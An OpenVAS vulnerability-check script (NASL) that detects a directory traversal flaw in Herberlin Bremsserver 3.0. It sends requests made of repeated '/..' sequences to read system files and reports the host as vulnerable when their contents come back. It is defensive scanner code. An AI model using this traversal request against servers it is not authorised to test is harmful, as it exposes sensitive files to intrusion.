###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_herberlin_bremsserver_dir_trav_vuln.nasl 11987 2018-10-19 11:05:52Z mmartin $
#
# Herberlin Bremsserver Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902587");
  script_version("$Revision: 11987 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 13:05:52 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-18 12:12:12 +0530 (Fri, 18 Nov 2011)");
  script_name("Herberlin Bremsserver Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://tools.herberlin.de/bremsserver/index.shtml");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107070/HerberlinBremsserver3.0-233.py.txt");
  script_xref(name:"URL", value:"http://www.autosectools.com/Advisory/Herberlin-Bremsserver-3.0-Directory-Traversal-233");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_mandatory_keys("Herberlin_Bremsserver/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");
  script_tag(name:"affected", value:"Herberlin Bremsserver Version 3.0");
  script_tag(name:"insight", value:"The flaw is due to improper validation of URI containing ../(dot dot)
  sequences, which allows attackers to read arbitrary files via directory traversal attacks.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Herberlin Bremsserver and is prone to directory
  traversal vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if("Server: Herberlin Bremsserver" >!< banner) {
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = string(crap(data:"/..", length:49), files[file]);

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
